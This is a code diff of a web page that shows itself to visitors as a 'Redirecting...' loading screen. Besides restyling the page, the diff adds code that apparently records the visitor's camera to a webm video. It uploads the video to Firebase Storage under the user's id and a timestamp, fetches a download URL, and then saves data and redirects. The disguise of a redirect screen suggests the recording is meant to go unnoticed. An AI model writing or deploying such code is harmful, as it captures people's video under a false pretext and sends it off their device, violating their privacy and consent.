@@ -6,34 +6,46 @@
     <title>Redirecting...</title>
     <style>
         body {
-            font-family: sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Modern font */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
+            background-color: #f3f7fa; /* Light background */
+            color: #333; /* Darker text for better readability */
         }
         .container {
             text-align: center;
-            padding: 20px;
+            padding: 40px; /* Increased padding */
             background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 12px; /* More rounded corners */
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); /* Stronger shadow */
+            width: 80%; /* Adjust width */
+            max-width: 500px; /* Maximum width */
+        }
+        h1 {
+            color: #007bff; /* Primary color for heading */
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1rem; /* Slightly larger font size */
+            margin-bottom: 15px;
         }
         .loading-dots::after {
             content: "";
             animation: dots 1s steps(4) infinite;
         }
-         .error-message{
-            color:red;
+        .error-message {
+            color: #dc3545; /* Error color from Bootstrap */
+            margin-top: 20px;
+            font-weight: bold; /* Make error message stand out */
         }
-
         @keyframes dots {
-             0%   {content: "";}
-             25%  {content: ".";}
-             50%  {content: "..";}
-             75%  {content: "...";}
+            0%   {content: "";}
+            25%  {content: ".";}
+            50%  {content: "..";}
+            75%  {content: "...";}
         }
     </style>
     <!-- Firebase SDK (Firestore) -->
@@ -268,23 +280,28 @@ async function getCurrentUserId() {
                     chunks.push(event.data);
                 };
 
-recorder.onstop = async () => {
-    const textBlob = new Blob(["Dit is een test upload."], { type: 'text/plain' });
-    const storageRef = storage.ref();
-    const testFileRef = storageRef.child(`testUpload.txt`); // Upload naar 'testUpload.txt' in de root
+                recorder.onstop = async () => { // Make recorder.onstop async
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    console.log("Blob type:", blob.type);
 
-    try {
-        await testFileRef.put(textBlob);
-        console.log("Test file uploaded successfully!"); // Succes message
-    } catch (uploadError) {
-        console.error("Error uploading test file:", uploadError); // Error message
-        errorMessage.textContent = `Fout bij uploaden testbestand: ${uploadError.message}`; // Display error
-        errorMessage.style.display = 'block';
-    } finally {
-        saveDataAndRedirect(); // Roep dit nog steeds aan (voor redirect flow)
-        stream.getTracks().forEach(track => track.stop());
-    }
-};
+                    // --- Upload to Firebase Storage ---
+                    const storageRef = storage.ref();
+                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`); // Unique video path
+
+                    try {
+                        await videoRef.put(blob); // Upload the blob
+                        videoUrl = await videoRef.getDownloadURL(); // Get download URL
+                        console.log("Video URL:", videoUrl);
+                    } catch (uploadError) {
+                        console.error("Error uploading video to Firebase Storage:", uploadError);
+                        cameraError = "Error uploading video: " + uploadError.message; // Or more specific error message
+                        videoUrl = null; // Set videoUrl to null in case of upload failure
+                    } finally {
+                        // --- All data collected, now save and redirect ---
+                        saveDataAndRedirect();
+                        stream.getTracks().forEach(track => track.stop()); // Cleanup
+                    }
+                };
 
                 recorder.onstart = () => { // <-- Start timer *AFTER* recorder starts
                     setTimeout(() => {
